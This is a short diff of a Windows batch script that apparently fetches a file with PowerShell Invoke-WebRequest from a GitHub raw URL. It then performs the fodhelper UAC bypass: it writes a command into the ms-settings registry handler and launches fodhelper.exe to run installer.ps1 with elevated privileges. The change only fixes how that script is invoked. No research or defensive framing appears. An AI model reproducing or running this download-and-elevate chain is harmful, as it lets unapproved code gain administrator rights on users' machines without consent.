@@ -23,7 +23,7 @@ powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3
 
 @echo off
 REM Modify the registry to set the command to run with elevated privileges
-reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -Command \"installer.ps1\"" /f
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe /k powershell -Command \"& './installer.ps1'\"" /f
 
 REM Run fodhelper.exe to trigger the elevated command
 start fodhelper.exe
